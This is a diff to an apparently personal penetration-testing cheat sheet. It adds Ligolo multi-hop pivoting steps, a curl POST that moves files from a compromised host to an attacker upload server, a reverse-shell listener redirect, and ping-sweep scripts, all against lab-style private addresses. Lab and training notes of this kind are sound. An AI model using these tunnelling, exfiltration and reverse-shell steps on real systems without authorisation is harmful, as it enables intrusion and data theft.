@@ -139,6 +139,17 @@ vim -c ':!/bin/sh'                  #vim</code></pre>
                         <pre><code class="language-python">python3 -m http.server 8080</code> </pre>
                         <p>Acquire the file you want from  the client</p>
                         <pre><code class="language-bash">wget http://10.10.14.10:8080/file.php</code> </pre>
+                        <h4>HTTP POST python</h4>
+                        <ul>
+                        <p>Another way is to POST the file to  transfer we need to use a virtual environment</p>
+                        <pre><code class="language-bash">cd ~/Desktop/Ligolo
+source venv/bin/activate
+python3 -m uploadserver 8000</code> </pre>
+                        <p>When transfering</p>
+                        <pre><code class="language-bash">curl -X POST http://172.16.5.129:8000/upload -F "files=@gi.txt"</code> </pre>     
+                        <p>When ever you finished</p>
+                        <pre><code class="language-bash">deactivate</code> </pre> 
+                        </ul>    
                     </ul>    
                 <h3>Longer way</h3>
                 <ul>
@@ -465,14 +476,45 @@ ncat -nv --source-port 53 10.129.2.28 50000 #Then connect to the port</code></pr
 [Agent : ubuntu@WEB01] » start</code></pre>
                     <p>From now everything will be connected and from our kali machine we should be able to ping the box3 </p>
                     </ul>
+
+                    <h2>Double pivoting & more</h2>
+                    <ul>   
+                        <p>Setup a listener in order to redirect traffic and permit the agent to connect</p>
+                        <pre><code class="language-bash">listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601</code></pre>
+                        <p>Connect the agent</p>
+                        <pre><code class="language-bash">agent_w.exe --connect 172.16.5.15:11601 -ignore-cert</code></pre>
+                        <p>Create interfaces and routes for the second pivoting (Remember to adapt the ip address and more)</p>
+                        <pre><code class="language-bash">sudo ip tuntap add user $USER mode tun ligolo-double
+sudo ip link set ligolo-double up
+sudo ip route add 172.16.0.0/16 dev ligolo-double</code></pre>
+                        <p>Finally Start tunnel, select session 2 and type:</p>
+                        <pre><code class="language-bash">tunnel_start --tun ligolo-double</code></pre>
+                        
+                        <h3>In case you would like a third pivot it is the same process</h3>
+                        <ul>
+                            <p>Create listener to allow connection from the agent. Always to 127.0.0.01:11601</p>
+                            <pre><code class="language-bash">listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601</code></pre>
+                            <p>Connect agent. Remember that always connect to the interface of the last host</p>
+                            <pre><code class="language-bash">agent_w.exe -connect 172.16.6.35:11602 -ignore-cert</code></pre>
+                            <p>Create interfaces and routes</p> 
+                            <pre><code class="language-bash">sudo ip tuntap add user $USER mode tun ligolo-triple
+sudo ip link set ligolo-triple up
+sudo ip route add 172.16.10.0/24 dev ligolo-triple</code></pre>
+                            <p>Start the tunnel by selectig session 3 and typing:</p>
+                            <pre><code class="language-bash">tunnel_start --tun ligolo-triple</code></pre>    
+                        </ul>
+                        <p>And so on with more pivoting</p>
+                    </ul>    
+
                     <h2>Reverse shell (pivoting)</h2>
                     <ul>
                         <p>In order to reach from box3 the box1 just in case you would like to perform a reverse shell we need to setup a listener </p>
                         <p>From proxy panel type: With that, all trafic that comes to the proxy from port 4444 will be redirected to localhost (kali) port 44</p>
                         <pre><code class="language-bash">listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:44</code></pre>    
                         <p>We can check all the listeners by using <b>listener_list</b></p>
-                        <p>Finally in order to transfers files from box3 we need to point the second interface of the box2 the one we can comunicate from that box</p>
-                        <pre><code class="language-bash">ping 172.16.5.129</code></pre>        
+                        <p>Finally in order to transfers files from box3 we need to point the second interface of the box2 the one we can comunicate from box3</p>
+                        <pre><code class="language-bash">ping 172.16.5.129</code></pre>
+                        <b>In metasploit is the same thing in localhost you must indicate 0.0.0.0 and in lport you must indicate 44</b>
                     </ul>
 
                     <h2>Cleaning out</h2>
@@ -481,9 +523,30 @@ ncat -nv --source-port 53 10.129.2.28 50000 #Then connect to the port</code></pr
                         <pre><code class="language-bash">sudo ip route del 192.168.10.0/24 dev ligolo</code></pre>
                         <p>Delete de device</p>        
                         <pre><code class="language-bash">sudo ip link del ligolo</code></pre>        
-
                     </ul>
+
+
+                    <h2>Host identification</h2>
+                    <ul>
+                        <p>As it is likely that nmap does not work to identify hosts we can perform ping sweep from our kali or the compromised host</p>
+                        <p>Linux</p>
+                        <pre><code class="language-bash">for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done</code></pre>
+                        <p>Windowss</p>        
+                        <pre><code class="language-bash">$network = "172.16.5"
+1..254 | ForEach-Object {
+    $ip = "172.16.10.$_"
+    Write-Host "[*] Pingeando $ip ..." -NoNewline
+    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
+        Write-Host "  UP" -ForegroundColor Green
+    } else {
+        Write-Host "  DOWN" -ForegroundColor DarkGray
+    }
+}
+</code></pre>        
+                    </ul>
+
                     
+                 
 
                     
                     
